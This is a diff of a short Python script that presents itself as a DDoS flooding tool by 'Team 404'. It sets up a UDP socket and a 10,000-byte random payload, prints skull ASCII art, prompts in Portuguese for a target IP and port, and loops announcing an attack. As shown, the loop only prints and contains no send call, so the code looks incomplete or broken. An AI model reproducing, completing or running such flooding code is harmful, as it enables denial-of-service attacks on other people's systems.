@@ -1,36 +1,16 @@
 import os
 import time
-import requests
-import json
 import socket
 import random
 
 sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
 bytes = random._urandom(10000)
 timeout = time.time ()
+azul= '\03'
 def script():
     os.system("clear")
     time.sleep(1)
-print('''\03
-404
-404
-404
-404
-404
-404
-404
-404
-404
-404
-404
-404
-404
-404
-404
-404
-404
-404''')
-print('''\03
+print(azul+'''                 
                   .xUHWH!! !!?M88WHX$X:.
                 .X*#M@$!!  !X!M$$$$$$WWx:.
                :!!!!!!?H! :!$!$$$$$$$$$$8X:
@@ -51,14 +31,12 @@ Wi.~!X$?!-~    : ?$$$B$Wu("**$RM!
 $R@i.~~ !     :   ~$$$$$B$$en:``
 ?MXT@Wx.~    :     ~"##*$$$$M~
 ''')
-print("\n")
-def ddos404():
-    time.sleep(1)
-    print("Created by syxz404")
+time.sleep(1)
+print("Created by syxz404")
 ip = input ("digite o ip:")
 port = int(input("digite a porta:"))
 
 while True:
-    print (" [?] ATTACKING SEND BY TEAM 404 ")
+    print (azul+" [?] ATTACKING SEND BY TEAM 404 ")
 if port == 6500:
     port = 1
